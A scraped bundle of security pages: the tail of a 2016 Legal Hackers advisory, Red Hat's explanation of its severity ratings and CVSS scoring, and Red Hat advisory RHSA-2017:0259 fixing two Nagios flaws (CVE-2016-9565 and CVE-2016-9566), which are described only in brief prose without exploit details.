dawid (at) legalhackers (dot) com

<https://legalhackers.com>

XI. REVISION HISTORY
-------------------------

13.12.2016 - Advisory released
14.12.2016 - Extended introduction

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Check out the new project of the same author:
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)
[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

```


=== Content from access.redhat.com_f3632052_20250126_033725.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)

  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Product Documentation](https://access.redhat.com/documentation)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)

  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform)
  [All Product Docs](//docs.redhat.com/en/products/)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)

  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Classifications](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Severety Ratings](https://access.redhat.com/security/security-updates/#/cve)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)

  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

 Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com)

### Help

* [Contact Customer Portal](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Systems Status

### About

* [Red Hat Subscription Value](https://access.redhat.com/subscription-value)
* [About Red Hat](https://www.redhat.com/about/)
* [Red Hat Jobs](http://jobs.redhat.com)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

Copyright © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)

×
### Formatting Tips

Here are the common uses of Markdown.

Code blocks
```
~~~
Code surrounded in tildes is easier to read
~~~
```

Links/URLs`[Red Hat Customer Portal](https://access.redhat.com)`

[Learn more](/help/markdown)
Close



=== Content from twitter.co_f6e05391_20250126_033721.html ===




=== Content from rhn.redhat.com_62ddebd3_20250124_212414.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2017:0259 - Security Advisory

Issued:
2017-02-07
Updated:
2017-02-07
# RHSA-2017:0259 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: nagios security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0259)

## Topic

An update for nagios is now available for Red Hat Gluster Storage 3.1 for RHEL 6.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Nagios is a program that monitors hosts and services on your network, and has the ability to send email or page alerts when a problem arises or is resolved.

Security Fix(es):

* It was found that an attacker who could control the content of an RSS feed could execute code remotely using the Nagios web interface. This flaw could be used to gain access to the remote system and in some scenarios control over the system. (CVE-2016-9565)
* A privilege escalation flaw was found in the way Nagios handled log files. An attacker able to control the Nagios logging configuration (the 'nagios' user/group) could use this flaw to elevate their privileges to root. (CVE-2016-9566)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

## Affected Products

* Red Hat Gluster Storage Server for On-premise 3 for RHEL 6 x86\_64
* Red Hat Gluster Storage Nagios Server 3 for RHEL 6 x86\_64

## Fixes

* [BZ - 1402869](https://bugzilla.redhat.com/show_bug.cgi?id=1402869)
  - CVE-2016-9566 nagios: Privilege escalation issue
* [BZ - 1405363](https://bugzilla.redhat.com/show_bug.cgi?id=1405363)
  - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS

## CVEs

* [CVE-2016-9565](https://www.redhat.com/security/data/cve/CVE-2016-9565.html)
* [CVE-2016-9566](https://www.redhat.com/security/data/cve/CVE-2016-9566.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat Gluster Storage Server for On-premise 3 for RHEL 6

| SRPM | |
| --- | --- |
| nagios-3.5.1-9.el6.src.rpm | SHA-256: c51d0665f2a49e63240d513a46c6e8522fe3e9adf4f1c7537476c568d4861230 |
| x86\_64 | |
| nagios-3.5.1-9.el6.x86\_64.rpm | SHA-256: 3a98a75832187d4da3b1868fb633c005618184bd6aa3f2ab0645124882b1ffb8 |
| nagios-common-3.5.1-9.el6.x86\_64.rpm | SHA-256: 82b833d5d39d61173368cf8caaa4e35a67fe69d24410a425f335597eedf45c5f |
| nagios-debuginfo-3.5.1-9.el6.x86\_64.rpm | SHA-256: 1692b15d40b8c6e40dbedc5e1908ef37bae998afbc9902bc5a7c4d806723a7b4 |

## Red Hat Gluster Storage Nagios Server 3 for RHEL 6

| SRPM | |
| --- | --- |
| nagios-3.5.1-9.el6.src.rpm | SHA-256: c51d0665f2a49e63240d513a46c6e8522fe3e9adf4f1c7537476c568d4861230 |
| x86\_64 | |
| nagios-3.5.1-9.el6.x86\_64.rpm | SHA-256: 3a98a75832187d4da3b1868fb633c005618184bd6aa3f2ab0645124882b1ffb8 |
| nagios-common-3.5.1-9.el6.x86\_64.rpm | SHA-256: 82b833d5d39d61173368cf8caaa4e35a67fe69d24410a425f335597eedf45c5f |
| nagios-debuginfo-3.5.1-9.el6.x86\_64.rpm | SHA-256: 1692b15d40b8c6e40dbedc5e1908ef37bae998afbc9902bc5a7c4d806723a7b4 |
| nagios-devel-3.5.1-9.el6.x86\_64.rpm | SHA-256: 635845262ad91c5f19ba97ba7a27136d3f8e4f8bd210b0dda19d28802ab49460 |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from bugzilla.redhat.com_f9c30ab2_20250126_033724.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1402869)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1402869)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1402869)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1402869

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
